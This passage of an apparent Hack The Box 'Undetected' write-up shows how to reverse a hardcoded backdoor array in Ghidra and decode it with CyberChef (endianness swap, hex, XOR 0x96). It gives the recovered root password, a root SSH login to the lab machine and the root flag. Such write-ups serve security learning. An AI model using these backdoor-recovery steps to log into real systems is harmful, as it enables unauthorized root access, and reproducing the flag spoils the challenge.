We can see the ```backdoor``` array which XOR later with ```0x96```.

Let's arrenge the ```backdoor```:
```c
backdoor[30] = -0x5b;
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._0_4_ = 0xf0e7abd6;
```

We can see on Ghidra that ```backdoor[30]``` is ```0xa5```:

![backdoor30.JPG](images/backdoor30.JPG)

So let's replace it:
```c
backdoor[30] = 0xa5;
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._0_4_ = 0xf0e7abd6;
```

Next, Let's take it to [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg) to swap endianness:

![swap.JPG](images/swap.JPG)

The word length ```31``` it's because the ```backdoor``` array size is ```31```.

Next, Let's convert it [from hex using CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,false)From_Hex('Space')&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg):

![fromhex.JPG](images/fromhex.JPG)

And finally let's [XOR it with 0x96](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,false)From_Hex('Space')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg):

![xor96.JPG](images/xor96.JPG)

We get the password ```@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3```.

Let's use it:
```console
┌─[evyatar@parrot]─[/hackthebox/Undetected]
└──╼ $ ssh root@10.10.11.146
root@10.10.11.146's password: 
Last login: Tue Feb  8 20:11:45 2022 from 10.10.14.23
root@production:~# hostname && whoami
production
root
root@production:~# cat root.txt
7218c5cb1988b52a8dbe5addd26669a6
```

And we get the root flag ```7218c5cb1988b52a8dbe5addd26669a6```.
